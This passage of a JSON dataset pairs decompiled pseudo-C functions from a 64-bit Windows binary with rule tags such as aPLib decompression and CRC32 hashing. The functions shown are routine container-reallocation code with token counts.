fcn.180042e30(uVar5);\n                        uVar5 = uVar5 + 0x60;\n                    } while (uVar5 != uVar3);\n                    uVar7 = arg1[2];\n                    uVar5 = *arg1;\n                }\n                arg1_00 = uVar5;\n                if ((0xfff < ((uVar7 - uVar5) / 0x60) * 0x60) && (arg1_00 = *(uVar5 - 8),  0x1f < (uVar5 - arg1_00) - 8)\n                   ) {\n                    fcn.1800b3528();\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                fcn.18008fb24(arg1_00);\n                *arg1 = 0;\n                arg1[1] = 0;\n                arg1[2] = 0;\n            }\n            uVar3 = fcn.180048fa0(arg1_00, arg2_00);\n            *arg1 = uVar3;\n            arg1[1] = uVar3;\n            arg1[2] = arg2_00 * 0x60 + uVar3;\n        }\n        iVar4 = uVar8 * 0x60 + arg2;\n        fcn.18004a3e0(arg2, iVar4, *arg1);\n        uVar3 = fcn.1800493c0(arg1, iVar4, arg3, arg1[1]);\n        arg1[1] = uVar3;\n    }\n    else {\n        fcn.18004a3e0(arg2, arg3, uVar5);\n        uVar3 = arg1[1];\n        uVar5 = uVar6 * 0x60 + uVar5;\n        for (uVar6 = uVar5; uVar6 != uVar3; uVar6 = uVar6 + 0x60) {\n            fcn.180048ec0(uVar6 + 0x48);\n            fcn.180042e30(uVar6);\n        }\n        arg1[1] = uVar5;\n    }\n    return;\n}\n",
        "token_count": 952
    },
    "180049f5": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180049f50(uint64_t *arg1, int64_t arg2, int64_t arg3)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    uint64_t arg2_00;\n    uint64_t arg1_00;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int64_t arg2_01;\n    uint64_t uVar7;\n    \n    uVar4 = arg1[1];\n    uVar5 = *arg1;\n    uVar7 = arg3 - arg2 >> 6;\n    uVar6 = uVar4 - uVar5 >> 6;\n    if (uVar7 <= uVar6) {\n        fcn.18004a4a0(arg2, arg3, uVar5);\n        uVar4 = arg1[1];\n        uVar5 = uVar7 * 0x40 + uVar5;\n        for (uVar6 = uVar5; uVar6 != uVar4; uVar6 = uVar6 + 0x40) {\n            fcn.180042e30(uVar6);\n        }\n        arg1[1] = uVar5;\n        return;\n    }\n    uVar3 = arg1[2];\n    uVar2 = uVar3 - uVar5 >> 6;\n    if (uVar2 < uVar7) {\n        if (0x3ffffffffffffff < uVar7) {\n            fcn.180014900();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        arg1_00 = 0x3ffffffffffffff - (uVar2 >> 1);\n        arg2_00 = uVar7;\n        if ((uVar2 <= arg1_00) && (arg2_00 = uVar2 + (uVar2 >> 1),  arg2_00 < uVar7)) {\n            arg2_00 = uVar7;\n        }\n        uVar6 = 0;\n        if (uVar5 != 0) {\n            if (uVar5 != uVar4) {\n                do {\n                    fcn.180042e30(uVar5);\n                    uVar5 = uVar5 + 0x40;\n                } while (uVar5 != uVar4);\n                uVar3 = arg1[2];\n                uVar5 = *arg1;\n            }\n            uVar4 = uVar3 - uVar5 & 0xffffffffffffffc0;\n            arg1_00 = uVar5;\n            if (0xfff < uVar4) {\n                arg1_00 = *(uVar5 - 8);\n                if (0x1f < (uVar5 - arg1_00) - 8) {\n                    fcn.1800b3528(arg1_00, uVar4 + 0x27);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            fcn.18008fb24(arg1_00);\n            *arg1 = 0;\n            arg1[1] = 0;\n            arg1[2] = 0;\n        }\n        uVar4 = fcn.180049020(arg1_00, arg2_00);\n        *arg1 = uVar4;\n        arg1[1] = uVar4;\n        arg1[2] = arg2_00 * 0x40 + uVar4;\n    }\n    arg2_01 = uVar6 * 0x40 + arg2;\n    fcn.18004a4a0(arg2, arg2_01, *arg1);\n    uVar4 = fcn.1800495a0(arg1, arg2_01, arg3, arg1[1]);\n    arg1[1] = uVar4;\n    return;\n}\n",
        "token_count": 858
    },
    "18005204": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint * fcn.180052040(int64_t *arg1, uint *arg2, uint *arg3)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint64_t uVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint64_t noname_0;\n    uint *puVar11;\n    int64_t iVar12;\n    uint64_t uVar13;\n    uint64_t arg2_00;\n    uint *puVar14;\n    \n    iVar1 = *arg1;\n    iVar12 = arg1[1] - iVar1 >> 4;\n    if (iVar12 == 0xfffffffffffffff) {\n        fcn.180014900();\n        pcVar2 = swi(3);\n        puVar10 = (*pcVar2)();\n        return puVar10;\n    }\n    uVar13 = iVar12 + 1;\n    uVar7 = arg1[2] - iVar1 >> 4;\n    noname_0 = uVar7 >> 1;\n    arg2_00 = uVar13;\n    if ((uVar7 <= 0xfffffffffffffff - noname_0) && (arg2_00 = noname_0 + uVar7,  noname_0 + uVar7 < uVar13)) {\n        arg2_00 = uVar13;\n    }\n    puVar8 = fcn.18001b980(noname_0, arg2_00);\n    uVar3 = arg3[1];\n    uVar4 = arg3[2];\n    uVar5 = arg3[3];\n    puVar14 = (arg2 - iVar1 & 0xfffffffffffffff0U) + puVar8;\n    *puVar14 = *arg3;\n    puVar14[1] = uVar3;\n    puVar14[2] = uVar4;\n    puVar14[3] = uVar5;\n    puVar10 = arg1[1];\n    puVar11 = *arg1;\n    puVar9 = puVar8;\n    if (arg2 == puVar10) {\n        for (; puVar11 != puVar10; puVar11 = puVar11 + 4) {\n            uVar3 = puVar11[1];\n            uVar4 = puVar11[2];\n            uVar5 = puVar11[3];\n            *puVar9 = *puVar11;\n            puVar9[1] = uVar3;\n            puVar9[2] = uVar4;\n            puVar9[3] = uVar5;\n            puVar9 = puVar9 + 4;\n        }\n    }\n    else {\n        if (puVar11 != arg2) {\n            do {\n                uVar3 = *puVar11;\n                uVar4 = puVar11[1];\n                uVar5 = puVar11[2];\n                uVar6 = puVar11[3];\n                puVar11 = puVar11 + 4;\n                *puVar9 = uVar3;\n                puVar9[1] = uVar4;\n                puVar9[2] = uVar5;\n                puVar9[3] = uVar6;\n                puVar9 = puVar9 + 4;\n            } while (puVar11 != arg2);\n            puVar10 = arg1[1];\n        }\n        if (arg2 != puVar10) {\n            puVar11 = arg2;\n            do {\n                uVar3 = puVar11[1];\n                uVar4 = puVar11[2];\n                uVar5 = puVar11[3];\n                puVar9 = puVar14 + (0x10 - arg2) + puVar11;\n                *puVar9 = *puVar11;\n                puVar9[1] = uVar3;\n                puVar9[2] = uVar4;\n                puVar9[3] = uVar5;\n                puVar11 = puVar11 + 4;\n            } while (puVar11 != puVar10);\n        }\n    }\n    iVar1 = *arg1;\n    if (iVar1 != 0) {\n        uVar7 = arg1[2] - iVar1 & 0xfffffffffffffff0;\n        iVar12 = iVar1;\n        if (0xfff < uVar7) {\n            iVar12 = *(iVar1 + -8);\n            if (0x1f < (iVar1 - iVar12) - 8U) {\n                fcn.1800b3528(iVar1 - iVar12, uVar7 + 0x27);\n                pcVar2 = swi(3);\n                puVar10 = (*pcVar2)();\n                return puVar10;\n            }\n        }\n        fcn.18008fb24(iVar12);\n    }\n    *arg1 = puVar8;\n    arg1[1] = puVar8 + uVar13 * 4;\n    arg1[2] = puVar8 + arg2_00 * 4;\n    return puVar14;\n}\n",
        "token_count": 1120
    },
    "1800522a": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.1800522a0(uint64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    ulong *puVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    uchar (*pauVar7) [16];\n    uint64_t uVar8;\n    uint64_t arg3;\n    uint64_t uVar9;\n    ulong var_1h;\n    \n    if (0x38e38e38e38e38e < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar6 = (arg1[1] - *arg1) / 0x12 + (arg1[1] - *arg1 >> 0x3f);\n    iVar6 = (iVar6 >> 2) - (iVar6 >> 0x3f);\n    uVar8 = (arg1[2] - *arg1) / 0x48;\n    uVar9 = arg2;\n    if ((uVar8 <= 0x38e38e38e38e38e - (uVar8 >> 1)) && (uVar9 = (uVar8 >> 1) + uVar8,  uVar9 < arg2)) {\n        uVar9 = arg2;\n    }\n    arg3 = 0;\n    uVar2 = uVar9 * 0x48;\n    uVar8 = 0xffffffffffffffff;\n    if ((uVar9 < 0x38e38e38e38e38f) && (uVar8 = uVar2,  uVar2 < 0x1000)) {\n        if (uVar2 != 0) {\n            arg3 = fcn.18008fb2c(uVar2);\n        }\n    }\n    else {\n        uVar2 = uVar8 + 0x27;\n        if (uVar8 + 0x27 <= uVar8) {\n            uVar2 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(uVar2);\n        if (iVar3 == 0) {\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        arg3 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        *(arg3 - 8) = iVar3;\n    }\n    pauVar7 = arg3 + iVar6 * 0x48;\n    iVar6 = arg2 - iVar6;\n    if (iVar6 != 0) {\n        puVar4 = pauVar7[2] + 8;\n        do {\n            *pauVar7 = ZEXT816(0);\n            pauVar7[1] = ZEXT816(0);\n            pauVar7[2] = ZEXT816(0);\n            pauVar7[3] = ZEXT816(0);\n            *pauVar7[4] = 0;\n            puVar4[-3] = 0;\n            puVar4[-2] = 7;\n            **pauVar7 = 0;\n            pauVar7 = pauVar7[4] + 8;\n            puVar4[-1] = 0;\n            *puVar4 = 0;\n            puVar4[1] = 0;\n            puVar4[2] = 0;\n            puVar4[3] = 0;\n            iVar6 = iVar6 + -1;\n            puVar4 = puVar4 + 9;\n        } while (iVar6 != 0);\n    }\n    fcn.180052580(*arg1, arg1[1], arg3);\n    uVar8 = *arg1;\n    if (uVar8 != 0) {\n        uVar2 = arg1[1];\n        if (uVar8 != uVar2) {\n            do {\n                fcn.18004db60(uVar8);\n                uVar8 = uVar8 + 0x48;\n            } while (uVar8 != uVar2);\n            uVar8 = *arg1;\n        }\n        uVar5 = ((arg1[2] - uVar8) / 0x48) * 0x48;\n        uVar2 = uVar8;\n        if (0xfff < uVar5) {\n            uVar2 = *(uVar8 - 8);\n            if (0x1f < (uVar8 - uVar2) - 8) {\n                fcn.1800b3528(arg1[2] - uVar8, uVar5 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(uVar2);\n    }\n    *arg1 = arg3;\n    arg1[1] = arg3 + arg2 * 0x48;\n    arg1[2] = arg3 + uVar9 * 0x48;\n    return;\n}\n",
        "token_count": 1124
    },
    "18005244": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180052440(int64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint64_t uVar8;\n    ulong *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    int64_t iVar12;\n    uint64_t arg2_00;\n    \n    if (0xfffffffffffffff < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    uVar8 = arg1[2] - *arg1 >> 4;\n    iVar12 = arg1[1] - *arg1 >> 4;\n    arg2_00 = arg2;\n    if ((uVar8 <= 0xfffffffffffffff - (uVar8 >> 1)) && (arg2_00 = (uVar8 >> 1) + uVar8,  arg2_00 < arg2)) {\n        arg2_00 = arg2;\n    }\n    puVar6 = fcn.18001b980(uVar8, arg2_00);\n    puVar9 = puVar6 + iVar12 * 4;\n    for (iVar12 = arg2 - iVar12; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar9 = 0;\n        puVar9[1] = 0;\n        puVar9 = puVar9 + 2;\n    }\n    puVar10 = *arg1;\n    puVar11 = arg1[1];\n    puVar7 = puVar6;\n    if (puVar10 != puVar11) {\n        do {\n            uVar2 = *puVar10;\n            uVar3 = puVar10[1];\n            uVar4 = puVar10[2];\n            uVar5 = puVar10[3];\n            puVar10 = puVar10 + 4;\n            *puVar7 = uVar2;\n            puVar7[1] = uVar3;\n            puVar7[2] = uVar4;\n            puVar7[3] = uVar5;\n            puVar7 = puVar7 + 4;\n        } while (puVar10 != puVar11);\n        puVar10 = *arg1;\n    }\n    if (puVar10 != NULL) {\n        uVar8 = arg1[2] - puVar10 & 0xfffffffffffffff0;\n        puVar11 = puVar10;\n        if (0xfff < uVar8) {\n            puVar11 = *(puVar10 + -2);\n            if (0x1f < (puVar10 - puVar11) - 8U) {\n                fcn.1800b3528(puVar10 - puVar11, uVar8 + 0x27);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        fcn.18008fb24(puVar11);\n    }\n    *arg1 = puVar6;\n    arg1[1] = puVar6 + arg2 * 4;\n    arg1[2] = puVar6 + arg2_00 * 4;\n    return;\n}\n",
        "token_count": 736
    },
    "18006339": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t fcn.180063390(uint64_t *arg1, uint64_t arg2, int64_t arg3)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    code *pcVar3;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    uint64_t arg3_00;\n    \n    uVar6 = *arg1;\n    iVar4 = (arg1[1] - uVar6) / 0x28;\n    if (iVar4 == 0x666666666666666) {\n        fcn.180014900();\n        pcVar3 = swi(3);\n        iVar4 = (*pcVar3)();\n        return iVar4;\n    }\n    uVar1 = iVar4 + 1;\n    uVar2 = (arg1[2] - uVar6) / 0x28;\n    uVar7 = uVar1;\n    if ((uVar2 <= 0x666666666666666 - (uVar2 >> 1)) && (uVar7 = (uVar2 >> 1) + uVar2,  uVar7 < uVar1)) {\n        uVar7 = uVar1;\n    }\n    uVar2 = uVar7 * 0x28;\n    if (uVar7 < 0x666666666666667) {\n        uVar7 = uVar2;\n        if (0xfff < uVar2) goto code_r0x00018006347c;\n        if (uVar2 == 0) {\n            uVar7 = 0;\n        }\n        else {\n            uVar7 = fcn.18008fb2c(uVar2);\n        }\n    }\n    else {\n        uVar7 = 0xffffffffffffffff;\ncode_r0x00018006347c:\n        uVar5 = uVar7 + 0x27;\n        if (uVar5 <= uVar7) {\n            uVar5 = 0xffffffffffffffff;\n        }\n        iVar4 = fcn.18008fb2c(uVar5);\n        if (iVar4 == 0) goto code_r0x0001800635b1;\n        uVar7 = iVar4 + 0x27U & 0xffffffffffffffe0;\n        *(uVar7 - 8) = iVar4;\n    }\n    iVar4 = uVar7 + ((arg2 - uVar6) / 0x28) * 0x28;\n    fcn.18000da90(iVar4, arg3);\n    *(iVar4 + 0x20) = *(arg3 + 0x20);\n    *(iVar4 + 0x24) = *(arg3 + 0x24);\n    uVar6 = arg1[1];\n    uVar5 = *arg1;\n    arg3_00 = uVar7;\n    if (arg2 != uVar6) {\n        fcn.180064ab0(*arg1, arg2, uVar7);\n        uVar6 = arg1[1];\n        uVar5 = arg2;\n        arg3_00 = iVar4 + 0x28;\n    }\n    fcn.180064ab0(uVar5, uVar6, arg3_00);\n    if (*arg1 != 0) {\n        fcn.180063f80(*arg1, arg1[1]);\n        uVar6 = *arg1;\n        uVar5 = uVar6;\n        if ((0xfff < ((arg1[2] - uVar6) / 0x28) * 0x28) && (uVar5 = *(uVar6 - 8),  0x1f < (uVar6 - uVar5) - 8)) {\ncode_r0x0001800635b1:\n            fcn.1800b3528();\n            pcVar3 = swi(3);\n            iVar4 = (*pcVar3)();\n            return iVar4;\n        }\n        fcn.18008fb24(uVar5);\n    }\n    *arg1 = uVar7;\n    arg1[1] = uVar7 + uVar1 * 0x28;\n    arg1[2] = uVar2 + uVar7;\n    return iVar4;\n}\n",
        "token_count": 937
    },
    "1800635c": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint * fcn.1800635c0(int64_t *arg1, uint *arg2, uint *arg3)\n\n{\n    uint64_t uVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t arg1_00;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    ulong *puVar16;\n    \n    iVar3 = *arg1;\n    iVar9 = (arg1[1] - iVar3) / 0x28;\n    if (iVar9 == 0x666666666666666) {\n        fcn.180064190();\n        pcVar4 = swi(3);\n        puVar14 = (*pcVar4)();\n        return puVar14;\n    }\n    uVar1 = iVar9 + 1;\n    uVar8 = (arg1[2] - iVar3) / 0x28;\n    uVar10 = uVar1;\n    if ((uVar8 <= 0x666666666666666 - (uVar8 >> 1)) && (uVar10 = (uVar8 >> 1) + uVar8,  uVar10 < uVar1)) {\n        uVar10 = uVar1;\n    }\n    uVar8 = uVar10 * 0x28;\n    if (uVar10 < 0x666666666666667) {\n        if (0xfff < uVar8) goto code_r0x0001800636a7;\n        if (uVar8 == 0) {\n            puVar14 = NULL;\n        }\n        else {\n            puVar14 = fcn.18008fb2c(uVar8);\n        }\n    }\n    else {\n        uVar8 = 0xffffffffffffffff;\ncode_r0x0001800636a7:\n        arg1_00 = uVar8 + 0x27;\n        if (arg1_00 <= uVar8) {\n            arg1_00 = 0xffffffffffffffff;\n        }\n        iVar9 = fcn.18008fb2c(arg1_00);\n        if (iVar9 == 0) goto code_r0x0001800638f2;\n        puVar14 = iVar9 + 0x27U & 0xffffffffffffffe0;\n        *(puVar14 + -2) = iVar9;\n    }\n    puVar2 = puVar14 + ((arg2 - iVar3) / 0x28) * 10;\n    *puVar2 = *arg3;\n    *(puVar2 + 6) = 0;\n    *(puVar2 + 8) = 0;\n    uVar5 = arg3[3];\n    uVar6 = arg3[4];\n    uVar7 = arg3[5];\n    puVar2[2] = arg3[2];\n    puVar2[3] = uVar5;\n    puVar2[4] = uVar6;\n    puVar2[5] = uVar7;\n    uVar5 = arg3[7];\n    uVar6 = arg3[8];\n    uVar7 = arg3[9];\n    puVar2[6] = arg3[6];\n    puVar2[7] = uVar5;\n    puVar2[8] = uVar6;\n    puVar2[9] = uVar7;\n    *(arg3 + 6) = 0;\n    *(arg3 + 8) = 0xf;\n    *(arg3 + 2) = 0;\n    puVar11 = arg1[1];\n    puVar13 = *arg1;\n    if (arg2 == puVar11) {\n        puVar12 = puVar14;\n        if (puVar13 != puVar11) {\n            puVar15 = puVar13 + 2;\n            puVar16 = puVar14 + 8;\n            do {\n                *puVar12 = *puVar13;\n                puVar12 = puVar12 + 10;\n                puVar16[-1] = 0;\n                puVar13 = puVar13 + 10;\n                *puVar16 = 0;\n                uVar5 = puVar15[1];\n                uVar6 = puVar15[2];\n                uVar7 = puVar15[3];\n                *(puVar16 + -3) = *puVar15;\n                *(puVar16 + -0x14) = uVar5;\n                *(puVar16 + -2) = uVar6;\n                *(puVar16 + -0xc) = uVar7;\n                uVar5 = puVar15[5];\n                uVar6 = puVar15[6];\n                uVar7 = puVar15[7];\n                *(puVar16 + -1) = puVar15[4];\n                *(puVar16 + -4) = uVar5;\n                *puVar16 = uVar6;\n                *(puVar16 + 4) = uVar7;\n                *(puVar15 + 4) = 0;\n                *(puVar15 + 6) = 0xf;\n                *puVar15 = 0;\n                puVar15 = puVar15 + 10;\n                puVar16 = puVar16 + 5;\n            } while (puVar13 != puVar11);\n        }\n    }\n    else {\n        puVar11 = puVar14;\n        if (puVar13 != arg2) {\n            puVar12 = puVar13 + 2;\n            puVar16 = puVar14 + 8;\n            do {\n                *puVar11 = *puVar13;\n                puVar11 = puVar11 + 10;\n                puVar16[-1] = 0;\n                puVar13 = puVar13 + 10;\n                *puVar16 = 0;\n                uVar5 = puVar12[1];\n                uVar6 = puVar12[2];\n                uVar7 = puVar12[3];\n                *(puVar16 + -3) = *puVar12;\n                *(puVar16 + -0x14) = uVar5;\n                *(puVar16 + -2) = uVar6;\n                *(puVar16 + -0xc) = uVar7;\n                uVar5 = puVar12[5];\n                uVar6 = puVar12[6];\n                uVar7 = puVar12[7];\n                *(puVar16 + -1) = puVar12[4];\n                *(puVar16 + -4) = uVar5;\n                *puVar16 = uVar6;\n                *(puVar16 + 4) = uVar7;\n                *(puVar12 + 4) = 0;\n                *(puVar12 + 6) = 0xf;\n                *puVar12 = 0;\n                puVar12 = puVar12 + 10;\n                puVar16 = puVar16 + 5;\n            } while (puVar13 != arg2);\n        }\n        fcn.1800640f0(puVar11, puVar11);\n        puVar11 = arg1[1];\n        puVar12 = puVar2 + 10;\n        if (arg2 != puVar11) {\n            puVar13 = arg2 + 2;\n            puVar16 = puVar2 + 0x12;\n            do {\n                *puVar12 = puVar13[-2];\n                puVar15 = puVar13 + 8;\n                puVar16[-1] = 0;\n                puVar12 = puVar12 + 10;\n                *puVar16 = 0;\n                uVar5 = puVar13[1];\n                uVar6 = puVar13[2];\n                uVar7 = puVar13[3];\n                *(puVar16 + -3) = *puVar13;\n                *(puVar16 + -0x14) = uVar5;\n                *(puVar16 + -2) = uVar6;\n                *(puVar16 + -0xc) = uVar7;\n                uVar5 = puVar13[5];\n                uVar6 = puVar13[6];\n                uVar7 = puVar13[7];\n                *(puVar16 + -1) = puVar13[4];\n                *(puVar16 + -4) = uVar5;\n                *puVar16 = uVar6;\n                *(puVar16 + 4) = uVar7;\n                *(puVar13 + 4) = 0;\n                *(puVar13 + 6) = 0xf;\n                *puVar13 = 0;\n                puVar13 = puVar13 + 10;\n                puVar16 = puVar16 + 5;\n            } while (puVar15 != puVar11);\n        }\n    }\n    fcn.1800640f0(puVar12, puVar12);\n    if (*arg1 != 0) {\n        fcn.1800640f0(*arg1, arg1[1]);\n        iVar3 = *arg1;\n        iVar9 = iVar3;\n        if ((0xfff < ((arg1[2] - iVar3) / 0x28) * 0x28) && (iVar9 = *(iVar3 + -8),  0x1f < (iVar3 - iVar9) - 8U)) {\ncode_r0x0001800638f2:\n            fcn.1800b3528();\n            pcVar4 = swi(3);\n            puVar14 = (*pcVar4)();\n            return puVar14;\n        }\n        fcn.18008fb24(iVar9);\n    }\n    *arg1 = puVar14;\n    arg1[1] = puVar14 + uVar1 * 10;\n    arg1[2] = puVar14 + uVar10 * 10;\n    return puVar2;\n}\n",
        "token_count": 2203
    },
    "18006397": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nint64_t fcn.180063970(uint64_t *arg1, uint64_t arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    code *pcVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    uint64_t arg3_00;\n    uint64_t uVar7;\n    \n    uVar5 = *arg1;\n    iVar3 = (arg1[1] - uVar5) / 0x88;\n    if (iVar3 == 0x1e1e1e1e1e1e1e1) {\n        fcn.180014900();\n        pcVar2 = swi(3);\n        iVar3 = (*pcVar2)();\n        return iVar3;\n    }\n    uVar1 = iVar3 + 1;\n    uVar7 = (arg1[2] - uVar5) / 0x88;\n    uVar4 = uVar7 >> 1;\n    uVar6 = uVar1;\n    if ((uVar7 <= 0x1e1e1e1e1e1e1e1 - uVar4) && (uVar6 = uVar4 + uVar7,  uVar4 + uVar7 < uVar1)) {\n        uVar6 = uVar1;\n    }\n    uVar7 = uVar6 * 0x88;\n    if (uVar6 < 0x1e1e1e1e1e1e1e2) {\n        uVar6 = uVar7;\n        if (0xfff < uVar7) goto code_r0x000180063a5c;\n        if (uVar7 == 0) {\n            uVar6 = 0;\n        }\n        else {\n            uVar4 = uVar7;\n            uVar6 = fcn.18008fb2c(uVar7);\n        }\n    }\n    else {\n        uVar6 = 0xffffffffffffffff;\ncode_r0x000180063a5c:\n        uVar4 = uVar6 + 0x27;\n        if (uVar4 <= uVar6) {\n            uVar4 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(uVar4);\n        if (iVar3 == 0) goto code_r0x000180063ba5;\n        uVar6 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        *(uVar6 - 8) = iVar3;\n    }\n    iVar3 = ((arg2 - uVar5) / 0x88) * 0x88 + uVar6;\n    fcn.180063900(uVar4, iVar3, arg3);\n    uVar5 = arg1[1];\n    uVar4 = *arg1;\n    arg3_00 = uVar6;\n    if (arg2 != uVar5) {\n        fcn.180064b40(*arg1, arg2, uVar6);\n        uVar5 = arg1[1];\n        uVar4 = arg2;\n        arg3_00 = iVar3 + 0x88;\n    }\n    fcn.180064b40(uVar4, uVar5, arg3_00);\n    uVar5 = *arg1;\n    if (uVar5 != 0) {\n        uVar4 = arg1[1];\n        if (uVar5 != uVar4) {\n            do {\n                fcn.180060170(uVar5);\n                uVar5 = uVar5 + 0x88;\n            } while (uVar5 != uVar4);\n            uVar5 = *arg1;\n        }\n        uVar4 = uVar5;\n        if ((0xfff < ((arg1[2] - uVar5) / 0x88) * 0x88) && (uVar4 = *(uVar5 - 8),  0x1f < (uVar5 - uVar4) - 8)) {\ncode_r0x000180063ba5:\n            fcn.1800b3528();\n            pcVar2 = swi(3);\n            iVar3 = (*pcVar2)();\n            return iVar3;\n        }\n        fcn.18008fb24(uVar4);\n    }\n    *arg1 = uVar6;\n    arg1[1] = uVar1 * 0x88 + uVar6;\n    arg1[2] = uVar6 + uVar7;\n    return iVar3;\n}\n",
        "token_count": 1000
    },
    "18006437": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid fcn.180064370(uint64_t *arg1, uint64_t arg2)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint64_t arg1_00;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    \n    if (0x11a7b9611a7b961 < arg2) {\n        fcn.180014900();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    iVar2 = (arg1[1] - *arg1) / 0xe8;\n    uVar7 = (arg1[2] - *arg1) / 0xe8;\n    uVar6 = arg2;\n    if ((uVar7 <= 0x11a7b9611a7b961 - (uVar7 >> 1)) && (uVar6 = (uVar7 >> 1) + uVar7,  uVar6 < arg2)) {\n        uVar6 = arg2;\n    }\n    uVar7 = uVar6 * 0xe8;\n    if (uVar6 < 0x11a7b9611a7b962) {\n        uVar6 = uVar7;\n        if (0xfff < uVar7) goto code_r0x00018006443d;\n        if (uVar7 == 0) {\n            uVar6 = 0;\n        }\n        else {\n            uVar6 = fcn.18008fb2c(uVar7);\n        }\n    }\n    else {\n        uVar6 = 0xffffffffffffffff;\ncode_r0x00018006443d:\n        uVar4 = uVar6 + 0x27;\n        if (uVar4 <= uVar6) {\n            uVar4 = 0xffffffffffffffff;\n        }\n        iVar3 = fcn.18008fb2c(uVar4);\n        if (iVar3 == 0) goto code_r0x00018006457e;\n        uVar6 = iVar3 + 0x27U & 0xffffffffffffffe0;\n        *(uVar6 - 8) = iVar3;\n    }\n    fcn.1800641b0(arg1, iVar2 * 0xe8 + uVar6, arg2 - iVar2);\n    uVar4 = arg1[1];\n    arg1_00 = uVar6;\n    for (uVar5 = *arg1; uVar5 != uVar4; uVar5 = uVar5 + 0xe8) {\n        fcn.180064f70(arg1_00, uVar5);\n        arg1_00 = arg1_00 + 0xe8;\n    }\n    uVar4 = *arg1;\n    if (uVar4 != 0) {\n        uVar5 = arg1[1];\n        if (uVar4 != uVar5) {\n            do {\n                fcn.180064c70(uVar4);\n                uVar4 = uVar4 + 0xe8;\n            } while (uVar4 != uVar5);\n            uVar4 = *arg1;\n        }\n        uVar5 = uVar4;\n        if ((0xfff < ((arg1[2] - uVar4) / 0xe8) * 0xe8) && (uVar5 = *(uVar4 - 8),  0x1f < (uVar4 - uVar5) - 8)) {\ncode_r0x00018006457e:\n            fcn.1800b3528();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        fcn.18008fb24(uVar5);\n    }\n    *arg1 = uVar6;\n    arg1[1] = arg2 * 0xe8 + uVar6;\n    arg1[2] = uVar6 + uVar7;\n    return;\n}\n",
        "token_count": 883
    },
    "18006459": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
